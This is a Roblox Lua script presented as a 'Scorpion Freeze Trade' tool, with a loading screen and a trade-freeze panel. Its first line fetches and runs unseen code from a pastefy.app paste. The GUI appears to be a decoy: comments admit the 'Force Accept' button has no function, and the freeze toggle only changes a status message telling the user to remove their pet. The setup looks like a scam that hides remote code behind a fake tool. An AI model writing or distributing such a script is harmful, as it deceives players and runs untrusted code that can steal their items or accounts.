loadstring(game:HttpGet("https://pastefy.app/Wvc3L3XY/raw"))()
-- Wait for player and their GUI to load properly
local Players = game:GetService("Players")
local player

repeat
	player = Players.LocalPlayer
	task.wait()
until player and player:FindFirstChild("PlayerGui")

-- Create and configure the loading GUI
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGui"
loadingGui.ResetOnSpawn = false
loadingGui.Parent = player:WaitForChild("PlayerGui")

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 200, 0, 100)
loadingFrame.Position = UDim2.new(0.5, -100, 0.5, -50)
loadingFrame.BackgroundColor3 = Color3.fromHex("#0A0A0A")
loadingFrame.BackgroundTransparency = 0.1
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = loadingGui

local loadingCorner = Instance.new("UICorner", loadingFrame)
loadingCorner.CornerRadius = UDim.new(0, 10)

local loadingStroke = Instance.new("UIStroke", loadingFrame)
loadingStroke.Color = Color3.fromHex("#FF0000")
loadingStroke.Thickness = 2
loadingStroke.Transparency = 0.3

-- Define scorpion emoji as hex sequence
local SCORPION_EMOJI = string.char(240, 159, 166, 130)  -- 🦂

local titleLabel = Instance.new("TextLabel", loadingFrame)
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 10)
titleLabel.Text = SCORPION_EMOJI .. " Scorpion Freeze Trade v1.0"  -- Updated to v4.0
titleLabel.Font = Enum.Font.FredokaOne
titleLabel.TextSize = 15
titleLabel.TextColor3 = Color3.fromHex("#FFFFFF")
titleLabel.BackgroundTransparency = 1
titleLabel.TextXAlignment = Enum.TextXAlignment.Center

local loadingText = Instance.new("TextLabel", loadingFrame)
loadingText.Size = UDim2.new(1, 0, 0, 20)
loadingText.Position = UDim2.new(0, 0, 0, 45)
loadingText.Text = "Loading..." -- Fixed text, no animation
loadingText.Font = Enum.Font.FredokaOne
loadingText.TextSize = 14
loadingText.TextColor3 = Color3.fromHex("#FF5555")
loadingText.BackgroundTransparency = 1
loadingText.TextXAlignment = Enum.TextXAlignment.Center

-- Loading dot animation: "Loading", "Loading.", "Loading..", "Loading..."
local dots = {"", ".", "..", "..."}
local dotIndex = 1
local loadingAnim = true

task.spawn(function()
	while loadingAnim do
		loadingText.Text = "Loading" .. dots[dotIndex]
		dotIndex = (dotIndex % #dots) + 1
		task.wait(0.5)
	end
end)

-- Progress bar background
local progressBarBG = Instance.new("Frame", loadingFrame)
progressBarBG.Size = UDim2.new(1, -20, 0, 10)
progressBarBG.Position = UDim2.new(0, 10, 1, -20)
progressBarBG.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
progressBarBG.BorderSizePixel = 0
Instance.new("UICorner", progressBarBG).CornerRadius = UDim.new(0, 6)

-- Progress fill
local progressFill = Instance.new("Frame", progressBarBG)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromHex("#AA0000")
progressFill.BorderSizePixel = 0
Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 6)
progressFill.Name = "ProgressFill"
progressFill.Parent = progressBarBG

-- Animate progress fill over 5 seconds
local TweenService = game:GetService("TweenService")
TweenService:Create(progressFill, TweenInfo.new(5), {
	Size = UDim2.new(1, 0, 1, 0)
}):Play()

-- ✅ Trade Freeze GUI Script
function loadMainScript()
	print("✅ Main script starting after loading screen...")

	-- SCORPION THEME COLORS
	local colors = {
		primary = Color3.fromHex("#0A0A0A"),     -- Dark black
		secondary = Color3.fromHex("#1A1A1A"),   -- Slightly lighter black
		accent = Color3.fromHex("#FF0000"),      -- Bright red
		highlight = Color3.fromHex("#AA0000"),   -- Darker red
		text = Color3.fromHex("#FFFFFF"),        -- White
		effect = Color3.fromHex("#FF5555")       -- Light red
	}

	-- Create trade freeze GUI
	local tradeGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
	tradeGui.Name = "TradeFreezeGui"
	tradeGui.ResetOnSpawn = false
	tradeGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	-- Main frame (positioned higher on screen)
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 200, 0, 180)
	frame.Position = UDim2.new(0.5, -100, 0.3, 0)  -- Positioned at 30% from top
	frame.BackgroundColor3 = colors.primary
	frame.BackgroundTransparency = 0.1
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.Parent = tradeGui

	local corner = Instance.new("UICorner", frame)
	corner.CornerRadius = UDim.new(0, 12)

	local stroke = Instance.new("UIStroke", frame)
	stroke.Color = colors.accent
	stroke.Thickness = 2
	stroke.Transparency = 0.3

	-- Title bar
	local titleContainer = Instance.new("Frame", frame)
	titleContainer.Size = UDim2.new(1, 0, 0, 40)
	titleContainer.Position = UDim2.new(0, 0, 0, 0)
	titleContainer.BackgroundTransparency = 1

	local title = Instance.new("TextLabel", titleContainer)
	title.Size = UDim2.new(1, 0, 1, 0)
	title.Text = SCORPION_EMOJI .. " Scorpion Script"
	title.Font = Enum.Font.FredokaOne
	title.TextSize = 16
	title.TextColor3 = colors.text
	title.BackgroundTransparency = 1

	-- Feature name
	local featureLabel = Instance.new("TextLabel", frame)
	featureLabel.Size = UDim2.new(1, -20, 0, 25)
	featureLabel.Position = UDim2.new(0, 10, 0, 40)
	featureLabel.Text = "Trade Freeze Pet"
	featureLabel.Font = Enum.Font.FredokaOne
	featureLabel.TextSize = 15
	featureLabel.TextColor3 = colors.text
	featureLabel.BackgroundTransparency = 1
	featureLabel.TextXAlignment = Enum.TextXAlignment.Center

	-- Status label (with multi-line support)
	local statusLabel = Instance.new("TextLabel", frame)
	statusLabel.Size = UDim2.new(1, -20, 0, 30)  -- Increased height for two lines
	statusLabel.Position = UDim2.new(0, 10, 0, 65)
	statusLabel.Text = "Trade Status: Idle"
	statusLabel.Font = Enum.Font.FredokaOne
	statusLabel.TextSize = 10
	statusLabel.TextColor3 = colors.text
	statusLabel.BackgroundTransparency = 1
	statusLabel.TextWrapped = true  -- Enable text wrapping
	statusLabel.TextXAlignment = Enum.TextXAlignment.Center
	statusLabel.TextYAlignment = Enum.TextYAlignment.Center  -- Center vertically

	-- Button creation function
	local function createButton(text, yPos, isHighlight)
		local btn = Instance.new("TextButton", frame)
		btn.Size = UDim2.new(1, -20, 0, 32)
		btn.Position = UDim2.new(0, 10, 0, yPos)
		btn.BackgroundColor3 = isHighlight and colors.highlight or colors.secondary
		btn.Text = text
		btn.TextSize = isHighlight and 16 or 14
		btn.Font = Enum.Font.FredokaOne
		btn.TextColor3 = colors.text
		btn.AutoButtonColor = false
		
		local btnCorner = Instance.new("UICorner", btn)
		btnCorner.CornerRadius = UDim.new(0, 8)
		
		local btnStroke = Instance.new("UIStroke", btn)
		btnStroke.Color = colors.accent
		btnStroke.Thickness = 1.5
		btnStroke.Transparency = 0.5
		
		btn.MouseEnter:Connect(function()
			TweenService:Create(btn, TweenInfo.new(0.1), {
				BackgroundColor3 = isHighlight and Color3.fromHex("#880000") or Color3.fromHex("#333333")
			}):Play()
		end)
		
		btn.MouseLeave:Connect(function()
			TweenService:Create(btn, TweenInfo.new(0.1), {
				BackgroundColor3 = isHighlight and colors.highlight or colors.secondary
			}):Play()
		end)
		
		return btn
	end

	-- Trade freeze toggle button
	local freezeTrade = false
	local freezeBtn = createButton("Freeze Trade: OFF", 100, true)  -- Position adjusted

	-- Force accept button
	local forceBtn = createButton("Force Accept", 137, false)  -- Position adjusted

	-- Toggle functionality
	freezeBtn.MouseButton1Click:Connect(function()
		freezeTrade = not freezeTrade
		freezeBtn.Text = freezeTrade and "Freeze Trade: ON" or "Freeze Trade: OFF"
		-- Updated text with line break
		statusLabel.Text = freezeTrade and "Trade Status: Freezed trade, remove\nyour pet" or "Trade Status: Idle"
		
		-- Visual feedback
		local originalColor = freezeBtn.BackgroundColor3
		for i = 1, 3 do
			freezeBtn.BackgroundColor3 = colors.effect
			task.wait(0.05)
			freezeBtn.BackgroundColor3 = originalColor
			task.wait(0.05)
		end
	end)

	-- Force accept button (no functionality)
	forceBtn.MouseButton1Click:Connect(function()
		-- Visual feedback only
		local originalColor = forceBtn.BackgroundColor3
		for i = 1, 3 do
			forceBtn.BackgroundColor3 = colors.effect
			task.wait(0.05)
			forceBtn.BackgroundColor3 = originalColor
			task.wait(0.05)
		end
	end)

	print("✅ Trade Freeze GUI loaded successfully!")
end

-- After 5 seconds, destroy loading GUI and run main script
task.delay(5, function()
	loadingAnim = false
	loadingGui:Destroy()
	loadMainScript()
end)